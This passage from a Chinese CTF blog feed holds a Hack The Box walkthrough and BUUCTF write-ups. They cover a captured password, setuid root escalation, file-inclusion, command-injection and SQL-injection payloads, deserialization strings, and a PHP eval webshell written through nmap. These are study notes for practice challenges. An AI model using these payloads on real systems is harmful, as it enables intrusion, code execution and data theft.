pcaps&#x2F;<strong>${<strong>i</strong>}</strong>.pcap 2&gt;&#x2F;dev&#x2F;null <strong>||</strong> break;  <strong>done</strong>;</p></blockquote><p>先查看下载的<code>0.cap</code>,根据之前的端口扫描，开放了FTP端口，可以看一下FTP协议的报文是否有登录记录：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202410261633890.png" alt="image-20240829162841043"></p><p>正好有一个，跟踪一下这个tcp流：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202410261633891.png" alt="image-20240829162930597"></p><p>看到了账户密码，可以ftp连接也可以ssh连接，ssh正常连接没有成功，学习了一下发现可以这样<code>sshpass</code>：</p><blockquote><p>sshpass -p ‘Buck3tH4TF0RM3!’ ssh <a href="mailto:&#110;&#97;&#x74;&#x68;&#97;&#x6e;&#64;&#49;&#x30;&#46;&#x31;&#x30;&#46;&#49;&#x30;&#x2e;&#x32;&#x34;&#x35;">&#110;&#97;&#x74;&#x68;&#97;&#x6e;&#64;&#49;&#x30;&#46;&#x31;&#x30;&#46;&#49;&#x30;&#x2e;&#x32;&#x34;&#x35;</a></p></blockquote><p>登陆上去之后发现一个linux的提权脚本，(lll￢ω￢)</p><p>直接跑一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202410261633892.png" alt="image-20240829161641874"></p><p>cap提权：</p><p>写一个python脚本然后用这个py3.8运行：</p><pre><code>import osos.setuid(0)os.system(&quot;/bin/bash&quot;)</code></pre><p>或者直接：</p><pre><code>nathan@cap:/var/www/html$ python3Python 3.8.5 (default, Jan 27 2021, 15:41:15) [GCC 9.3.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import os&gt;&gt;&gt; os.setuid(0)&gt;&gt;&gt; pty.spawn(&quot;bash&quot;)</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;Hack the box walkthrough&lt;/p&gt;</summary>
    
    
    
    
    <category term="HTB" scheme="https://taninluv.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF</title>
    <link href="https://taninluv.github.io/2023/12/04/BUUCTF/"/>
    <id>https://taninluv.github.io/2023/12/04/BUUCTF/</id>
    <published>2023-12-04T02:18:32.000Z</published>
    <updated>2024-07-11T01:38:09.358Z</updated>
    
    <content type="html"><![CDATA[<h1 id="warmUp1"><a href="#warmUp1" class="headerlink" title="warmUp1"></a>warmUp1</h1><pre><code>&lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#39;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#39;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;        include $_REQUEST[&#39;file&#39;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    &#125;  ?&gt;</code></pre><p>mb_strpos()：返回要查找的字符串在另一个一个字符串中首次出现的位置</p><p>mb_substr() 函数返回字符串的一部分。</p><p>这里的payload：</p><pre><code>source.php?file=hint.php?/../../../../../ffffllllaaaagggg</code></pre><p>hint.php后接了一个问号，这里是防止过waf时hint.php&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg整体被waf墙了，用？间隔开，此时判定函数中：</p><pre><code>$_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );</code></pre><p>这一段将截取到hint.php从而绕过waf，否则函数在末尾添加了一个？，导致进入白名单判定的 $page &#x3D;hint.php&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg而不是hint.php,这里进行了两次判定，一次经过了url解码，其实没什么影响，因为不是引用传参，判定的内容都一样。</p><h1 id="Include1"><a href="#Include1" class="headerlink" title="Include1"></a>Include1</h1><p>文件包含</p><p>确认file参数存在文件包含后，不知道flag在哪里，但是发现当前页面就是flag.php。可能得从源码里面看看：</p><pre><code>http://&#123;URL&#125;/?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><h1 id="PING-PING-PING"><a href="#PING-PING-PING" class="headerlink" title="PING PING PING"></a>PING PING PING</h1><p>发现过了空格、&lt;  、 &gt; {},这里可以直接使用$IFS</p><p>这里解释一下：</p><blockquote><p>通常使用${VAR}这种形式可以更清晰地表示变量名的边界。$IFS、$IFS$、${IFS}和${IFS}$都是对环境变量$IFS的引用，但是在特殊的上下文中可能会有微小的差异，但通常情况下它们表达的含义是相同的。</p></blockquote><p>然后发现过滤了flag，通配符？和*也被过滤了</p><p>那么可以考虑拼接、内联、编码等方法：</p><pre><code>cat$IFS`ls`</code></pre><pre><code>echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash </code></pre><pre><code>a=g;cat$IFS$1fla$a.php# 这里需要使用$IFS$1，可能是解析的时候界限区分问题</code></pre><h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><ol><li><p>修改表：</p><pre><code>1&#39;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#39;12&#39;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q</code></pre></li><li><p>预编译：</p></li></ol><p>prepare name from statement;</p><p>&#x3D;&#x3D;》预编译的用处在于statement里面可以使用连接字符拼接语句：</p><pre><code>prepare stmt from concat(&quot;selec&quot;,&quot;t flag from `1919810931114514`;&quot;);execute stmt;--+-</code></pre><h1 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h1><p>根本不easy 枯了</p><p>来自：[BUUCTF-<a href="https://blog.csdn.net/qq_46918279/article/details/120188186">SUCTF 2019]EasySQL1__Monica_的博客-CSDN博客</a></p><p>输入非零数字得到结果一直是1和而输入其余字符的数据就得不到回显&#x3D;&gt;来判断出内部的查询语句可能存在有||（即or：或运算）。</p><blockquote><p>payload:1;set sql_mode&#x3D;pipes_as_concat;select 1</p><p>#使用set sql_mode &#x3D; pipes_as_concat将｜｜作为字符串连接函数<br>那么sql语句就会为：<br>select 1;set sql_mode&#x3D;pipes_as_concat;select 1||flag from Flag;<br>即：<br>select 1;set sql_mode&#x3D;pipes_as_concat;select concat(1,flag) from Flag;</p></blockquote><blockquote><p>payload:*,1<br>1可以换成任何数字，但不能是其他（原因不知道）</p><p>这样我们执行的语句就为：<br>select *,1||flag from Flag<br>即：<br>select *,1 from Flag;</p></blockquote><p>第二个方法我觉得应该是select *,TRUE || flag from Flag</p><h1 id="Secret-File-1"><a href="#Secret-File-1" class="headerlink" title="Secret File 1"></a>Secret File 1</h1><pre><code>&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET[&#39;file&#39;];    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;</code></pre><p>这里</p><blockquote><p>stristr(string,search,before_search) 函数搜索字符串在另一字符串中的第一次出现，不区分大小写，默认返回匹配到的字符串及其之后的字符串</p><table><thead><tr><th><em>before_search</em></th><th>可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>strstr(string,search,before_search) 函数搜索字符串在另一字符串中的第一次出现。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p><strong>注释：</strong>该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 <a href="https://www.w3school.com.cn/php/func_string_stristr.asp">stristr()</a> 函数。</p></blockquote><p>直接包含flag.php即可，这里防止目录穿越好像就没了意义。。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110938696.png" alt="image-20231204150728572"></p><p>那就编码一下咯。。</p><pre><code>file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>这里先区分一下：</p><blockquote><ol><li>Referer（引用页）：<ul><li>Referer是一个HTTP请求头部字段，用于标识请求来源页面的URL。当浏览器向服务器发起请求时，Referer字段将包含当前请求的上一个页面的URL。</li><li>这个字段的主要作用是帮助网站和开发者追踪访问来源，了解用户从哪个页面跳转而来。有时也用于防止跨站请求伪造（CSRF）攻击。</li></ul></li><li>X-Forwarded-For（XFF，代理服务器转发的用户IP地址）：<ul><li>X-Forwarded-For是一个非标准的HTTP请求头部字段，通常由代理服务器（如负载均衡器、反向代理等）添加到HTTP请求中，用于标识客户端的原始IP地址。</li><li>当请求通过代理服务器时，代理服务器会将请求发送者的IP地址添加到X-Forwarded-For头部，以便服务器知道请求的真实来源。</li><li>这对于那些通过代理服务器进行网站访问的情况非常有用，因为它允许服务器获取到实际客户端的IP地址，而不是代理服务器的地址。</li></ul></li></ol></blockquote><p>最后发包：</p><pre><code class="http">GET /Secret.php HTTP/1.1Host: node4.buuoj.cn:28318Cache-Control: max-age=0X-Forwarded-For:127.0.0.1Referer:https://Sycsecret.buuoj.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Syclover/119.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: close</code></pre><h1 id="php-大坑"><a href="#php-大坑" class="headerlink" title="*php   -大坑"></a>*php   -大坑</h1><p>[BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112591542">极客大挑战 2019]PHP 1_buuojphp1-CSDN博客</a></p><p>拿到源码后，发现是一个反序列化</p><p>这里需要主义的是他的类属性是私有类，需要在变量名之前手动添加一个%00,因为打印时不会输出这个null，我们复制传入的时候需要手动添加一下</p><p>于此同时url识别不了<code>&quot;</code>，改为<code>%22</code></p><pre><code>?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</code></pre><p>这里既然要通过url传递，也可以直接在php中urlencode一下：</p><pre><code>O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D#两个%3A中间的2=》3</code></pre><h1 id="Easy-Calc1"><a href="#Easy-Calc1" class="headerlink" title="Easy Calc1"></a>Easy Calc1</h1><p>主要是通过ASCII绕过waf</p><p>php中ord把字符串转换为asill，chr反之，它们一次都只能处理一个ascii字符</p><p>scandir可以扫描目录，file_get_contents读取文件内容</p><h1 id="Easy-MD5-1"><a href="#Easy-MD5-1" class="headerlink" title="Easy MD5 1"></a>Easy MD5 1</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110938697.png" alt="image-20231204190813477"></p><pre><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p><em>md5(string,raw)</em></p><table><thead><tr><th>string</th><th>必需。要计算的字符串。</th></tr></thead><tbody><tr><td>raw</td><td>可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串</td></tr></tbody></table><blockquote><p>ffifdyop</p><p>129581926211651571912466741651878684928 也可达同样的效果</p><p>总之，相当于 select * from admin where password&#x3D;’’or ture</p></blockquote><p>这里需要md5值碰撞出包含 <code>&#39; or &#39;</code>的值</p><pre><code class="php">&lt;?php for ($i = 0;;) &#123;  for ($c = 0; $c &lt; 1000000; $c++, $i++)  if (stripos(md5($i, true), &#39;&#39;or&#39;&#39;) !== false)   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;; echo &quot;.&quot;;&#125;?&gt;</code></pre><ul><li><a href="https://www.w3school.com.cn/php/func_string_strpos.asp">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li><li><a href="https://www.w3school.com.cn/php/func_string_strripos.asp">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li><li><a href="https://www.w3school.com.cn/php/func_string_strrpos.asp">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li></ul><p>下一步：</p><pre><code>&lt;!--$a = $GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123;    // wow, glzjin wants a girl friend.--&gt;</code></pre><blockquote><p>不管是强类型还是弱类型，md5数组绕过就可以了</p></blockquote><h1 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h1><pre><code class="php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str = (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;</code></pre><p>pop链子，我们先看看我们需要触发的函数，这里显然时read()中的file_get_content(),以此达到一个文件读取，再往前看：</p><pre><code class="php"> public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;</code></pre><p>这里op&#x3D;2时可以触发read(),再追溯process，发现构造和析构时都调用了，构造函数反序列化时无法触发，只能看析构函数，析构函数我们发现是强等于“2”，那我们传入int 2就可以绕过第一个赋值，故payload：</p><pre><code class="php">&lt;?phpclass FileHandler &#123;    protected $op=2;    protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;    protected $content=&quot;233&quot;;&#125;$a=new FileHandler;echo serialize($a);</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;*content&quot;;s:3:&quot;233&quot;;&#125;</code></pre><p>protected属性会在变量名前添加标记%00*%00，所以手动补充一下</p><pre><code>O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;i:2;s:11:&quot;%00*%00filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;%00*%00content&quot;;s:3:&quot;233&quot;;&#125;</code></pre><p>发现这里有一个问题，这道题过滤了不可打印字符，%00是null这种不可打印的，所以把类属性改为public：</p><pre><code class="php">&lt;?php    class FileHandler &#123;        public $op = 2;        public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;        public $content;    &#125;    $a = new FileHandler();        $b = serialize($a);        echo($b);?&gt;</code></pre><h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>刚开始以为又是<code>随便注</code>那道题，发现预编译也被ban了，看来只能使用句柄了：</p><pre><code>handler `FlagHere` open as p;handler p read first;</code></pre><p>使用</p><pre><code>handler p read next;</code></pre><p>可以接着往下遍历</p><h1 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="*Easy Java"></a>*Easy Java</h1><p>第一次遇到文件下载漏洞</p><p>[<a href="https://www.cnblogs.com/Cl0ud/p/12177085.html">RoarCTF 2019]Easy Java - 春告鳥 - 博客园 (cnblogs.com)</a></p><pre><code> WEB-INF主要包含一下文件或目录：    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。    /WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 </code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110938698.png" alt="image-20231205165146499"></p><p>后一步</p><pre><code>filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p>这里在bp中读取好像可以直接反编译，使用idea等编译器也可以读取到</p><h1 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h1><p>这道题有两个做法可以绕过黑名单，一个是直接 \exec 这样绕过，第二种则是反序列化。这里之所以可以反序列化主要是他提供了一个类，并且析构时可以调用任意方法，此时我们可以指定它执行反序列化，反序列化时的方法不会受到黑名单影响</p><h1 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="*ZJCTF，不过如此"></a>*ZJCTF，不过如此</h1><p>这道题感觉做过，只是next中的函数有变化</p><pre><code>&lt;?php$id = $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] = $id;function complex($re, $str) &#123;    return preg_replace(        &#39;/(&#39; . $re . &#39;)/ei&#39;,        &#39;strtolower(&quot;\\1&quot;)&#39;,        $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;    echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;    @eval($_GET[&#39;cmd&#39;]);&#125;</code></pre><blockquote><p>这里的漏洞出在<strong>preg_replace</strong> <strong>&#x2F;e</strong> 模式下</p><p>e模式下的preg_replace可以让第二个参数’替换字符串’当作代码执行，但是这里第二个参数是不可变的，但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，并且从1开始排序，而strtolower(“\1”)正好表达的就是匹配区的第一个（\1&#x3D;\1），从而我们如果匹配可以，则可以将函数实现。<br>比如我们传入 ?.<em>&#x3D;**{${phpinfo()}}*</em></p><p>原句：preg_replace(‘&#x2F;(‘ . $re . ‘)&#x2F;ei’,’strtolower(“\1”)’,$str); 就变成preg_replace(‘&#x2F;(‘ .* ‘)&#x2F;ei’,’strtolower(“\1”)’,<strong>{${phpinfo()}}</strong>);</p><p>又因为$_GET传入首字母是非法字符时候会把  .（点号）改成下划线，因此得将.<em>换成\s</em></p><p>所有payload：?\S*&#x3D;${getFlag()}&amp;cmd&#x3D;system(‘ls &#x2F;‘); </p><p>[<a href="https://www.cnblogs.com/l0vehzzz/p/16415836.html">BJDCTF2020]ZJCTF，不过如此 - L0VEhzzz - 博客园 (cnblogs.com)</a></p></blockquote><p>这里的解释比较麻烦，看看这个：</p><p><a href="https://blog.csdn.net/giaogiao123/article/details/121217533">php代码审计之preg_replace函数_php preg_replace-CSDN博客</a></p><p>姑且记住payload：</p><p>\S*&#x3D;${getFlag()}&amp;cmd&#x3D;system(‘ls &#x2F;‘); </p><p>回到这道题，payload1：</p><pre><code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;ls /&#39;); </code></pre><p>通过preg_replace去调用getFlag函数，进一步传参cmd进行命令执行</p><p>payload2：蚁剑连接</p><pre><code>\S*=$&#123;@eval($_POST[cmd])&#125;</code></pre><h1 id="Online-Tool-1"><a href="#Online-Tool-1" class="headerlink" title="Online Tool 1"></a>Online Tool 1</h1><p>函数escapeshellarg的作用是把字符串转码为可以在 shell 命令里使用的参数，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p><p>函数escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： &amp;#;&#96;|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p><p>参数<code>-oG</code>可以将命令和结果写到同一个文件上</p><p>可以直接传一句话木马</p><pre><code class="php">?host=&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG test.php &#39;</code></pre><p>还有一种做法就是直接把命令改成读取flag文件</p><pre><code class="php">?host=&#39; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#39;</code></pre><h1 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h1><p>无参数RCE</p><p>exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p><pre><code>highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名next() 输出数组中的当前元素和下一个元素的值。array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)scandir() 函数返回指定目录中的文件和目录的数组。pos() 输出数组中的当前元素的值。localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;。</code></pre><p>session_id() 可以用来获取&#x2F;设置 当前会话 ID。<br>在我们使用 session_id()的时候 需要使用session_start()来开启session会话<br>我们尝试构造payload</p><pre><code>?exp=highlight_file( session_id(session_start()));</code></pre><p>session_id(session_start())<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。</p><p>抓包：</p><pre><code>cookie: PHPSESSID=flag.php</code></pre><h1 id="misc————"><a href="#misc————" class="headerlink" title="misc————"></a>misc————</h1><h1 id="两个部分的flag"><a href="#两个部分的flag" class="headerlink" title="两个部分的flag"></a>两个部分的flag</h1><p>有一部分居然在图片属性里面</p><p>steghide没能提取png的信息，zsteg直接就出来了</p><h1 id="压缩文件的快乐"><a href="#压缩文件的快乐" class="headerlink" title="压缩文件的快乐"></a>压缩文件的快乐</h1><p>这里补充一下伪加密：</p><pre><code>压缩源文件数据区：50 4B 03 04：这是头文件标记（0x04034b50）14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度00 00：扩展记录长度压缩源文件目录区：50 4B 01 02：目录中文件文件头标记(0x02014b50)3F 00：压缩使用的 pkware 版本14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了，当数字为奇数是为加密，为偶数时不加密）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度24 00：扩展字段长度00 00：文件注释长度00 00：磁盘开始号00 00：内部文件属性20 00 00 00：外部文件属性00 00 00 00：局部头部偏移量压缩源文件目录结束标志：50 4B 05 06：目录结束标记00 00：当前磁盘编号00 00：目录区开始磁盘编号01 00：本磁盘上纪录总数01 00：目录区中纪录总数59 00 00 00：目录区尺寸大小3E 00 00 00：目录区对第一张磁盘的偏移量00 00：ZIP 文件注释长度</code></pre><p>我们一般修改的是50 4B 01 02 14 00 01 00 &#x3D;&#x3D;》50 4B 0<code>1</code> 02 14 00 0<code>0</code> 00</p><p>这道题修改伪加密后解压软件报错的话，换成WinRAR或者检查修改位置是否正确</p><p>最后使用明文攻击：</p><pre><code>我们为zip压缩文件所设定的密码，首先被转换成3个32bit的key，所以可能的key的组合是2^96，这是个天文数字如果用暴力穷举的方式是不太可能的，除非你的密码比较短或者有个厉害的字典。压缩软件用这3个key加密所有包中的文件，也就是说，所有文件的key是一样的，如果我们能够找到这个key，就能解开所有的文件。如果我们找到加密压缩包中的任意一个文件，这个文件和压缩包里的文件是一样的我们把这个文件用同样的压缩软件同样的压缩方式进行无密码的压缩，得到的文件就是我们的Known plaintext（已知明文）。用这个无密码的压缩包和有密码的压缩包进行比较，分析两个包中相同的那个文件，抽取出两个文件的不同点，就是那3个key了，如此就能得到key。两个相同文件在压缩包中的字节数应该相差12个byte，就是那3个key了。虽然我们还是无法通过这个key还原出密码，但是我们已经可以用这个key解开所有的文件，所以已经满足我们的要求了，毕竟对我们而言，得到解压后的文件比得到密码本身更重要。</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;warmUp1&quot;&gt;&lt;a href=&quot;#warmUp1&quot; class=&quot;headerlink&quot; title=&quot;warmUp1&quot;&gt;&lt;/a&gt;warmUp1&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    highlight_file(__FILE__);
   </summary>
      
    
    
    
    
    <category term="CTF" scheme="https://taninluv.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MISC-NTA</title>
    <link href="https://taninluv.github.io/2023/11/28/MISC-NTA/"/>
    <id>https://taninluv.github.io/2023/11/28/MISC-NTA/</id>
    <published>2023-11-28T12:12:13.000Z</published>
    <updated>2024-07-11T01:40:42.674Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://academy.hackthebox.com/module/81/section/963">Intro to Network Traffic Analysis (hackthebox.com)</a></p><h1 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h1><h2 id="OSI"><a href="#OSI" class="headerlink" title="OSI"></a>OSI</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939343.png" alt="image-20231128201404021"></p><h2 id="协议数据单元（PDU）"><a href="#协议数据单元（PDU）" class="headerlink" title="协议数据单元（PDU）"></a>协议数据单元（PDU）</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939344.png" alt="image-20231128201442632"></p><h2 id="TCP三路握手"><a href="#TCP三路握手" class="headerlink" title="TCP三路握手"></a>TCP三路握手</h2><p>TCP确保数据从服务器传递到客户端的方法之一是会话的利用率。这些会话是通过所谓的三方握手建立的。为了实现这一点，TCP在TCP标头中使用了一个名为flags的选项。我们现在不会深入研究TCP标志；要知道，我们将在三方握手中看到的常见标志是同步（SYN）和确认（ACK）。当主机请求通过TCP与服务器进行对话时；</p><ul><li><p>客户端发送SYN标志设置为开启的数据包，以及TCP报头中的其他可协商选项。</p><ul><li>这是一个同步数据包。它将只在来自主机和服务器的第一个数据包中设置，并通过允许两端就开始通信的序列号达成一致来建立会话。</li><li>这对于数据包的跟踪至关重要。除了序列号同步，在这个阶段还协商了许多其他选项，包括窗口大小、最大段大小和选择性确认。</li></ul></li><li><p>服务器将用TCP数据包进行响应，该TCP数据包包括为序列号协商设置的SYN标志和为确认主机发送的先前SYN数据包设置的ACK标志。</p><ul><li>服务器还将包括对TCP标头的选项字段中所需设置的TCP选项的任何更改。</li></ul></li><li><p>客户端将使用TCP数据包进行响应，该TCP数据包具有同意协商的ACK标志集。 该数据包是三方握手的结束，并建立了客户端和服务器之间的连接。</p></li></ul><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939346.png" 